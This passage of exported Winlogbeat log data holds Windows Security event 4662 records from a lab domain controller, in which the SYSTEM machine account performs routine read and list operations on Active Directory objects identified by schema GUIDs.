			{bf96793f-0de6-11d0-a285-00aa003049e2}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
			{bf9679e7-0de6-11d0-a285-00aa003049e2}
			{f3a64788-5306-11d1-a9c5-0000f80367c1}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{26d9736d-6070-11d1-a9c6-0000f80367c1}
			{26d9736e-6070-11d1-a9c6-0000f80367c1}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
		{72e39547-7b18-11d1-adef-00c04fd8d5cd}
			{72e39547-7b18-11d1-adef-00c04fd8d5cd}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110098	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.166"	"gRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110097	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.166"	"gBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{3e0abfd0-126a-11d0-a060-00aa006c33ed}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110096	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.162"	"fxDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110089	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.162"	"fhDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110088	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.162"	"fRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110087	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.161"	"fBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967a6f-0de6-11d0-a285-00aa003049e2}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110080	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.161"	"exDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110079	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:13.161"	"ehDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:14.989"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0xCBEF8

Object:
	Object Server:		DS
	Object Type:		%{bf967a86-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{982038d5-105b-4435-8649-6de54950e06c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{982038d5-105b-4435-8649-6de54950e06c}"	DS	"%{bf967a86-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{26d97369-6070-11d1-a9c6-0000f80367c1}
	{bf967a86-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0xcbef8	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110078	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.540"	"eRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e5-0de6-11d0-a285-00aa003049e2}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967953-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{bf967a76-0de6-11d0-a285-00aa003049e2}
			{f30e3bc0-9ff0-11d1-b603-0000f80367c1}
			{f30e3bc1-9ff0-11d1-b603-0000f80367c1}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
			{42a75fc6-783f-11d2-9916-0000f87a57d4}
			{7bd4c7a6-1add-4436-8c04-3999a880154c}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e5-0de6-11d0-a285-00aa003049e2}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967953-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{bf967a76-0de6-11d0-a285-00aa003049e2}
			{f30e3bc0-9ff0-11d1-b603-0000f80367c1}
			{f30e3bc1-9ff0-11d1-b603-0000f80367c1}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
			{42a75fc6-783f-11d2-9916-0000f87a57d4}
			{7bd4c7a6-1add-4436-8c04-3999a880154c}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110070	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.540"	"eBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		READ_CONTROL
				
	Access Mask:		0x20000
	Properties:		READ_CONTROL
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%1538
				"	0x20000	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%1538
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110069	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.540"	"dxDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{0a1cb556-6e0e-4a04-a14e-244e0208b1f3}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110068	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.540"	"dhDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e5-0de6-11d0-a285-00aa003049e2}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967953-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{bf967a76-0de6-11d0-a285-00aa003049e2}
			{f30e3bc0-9ff0-11d1-b603-0000f80367c1}
			{f30e3bc1-9ff0-11d1-b603-0000f80367c1}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
			{42a75fc6-783f-11d2-9916-0000f87a57d4}
			{7bd4c7a6-1add-4436-8c04-3999a880154c}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
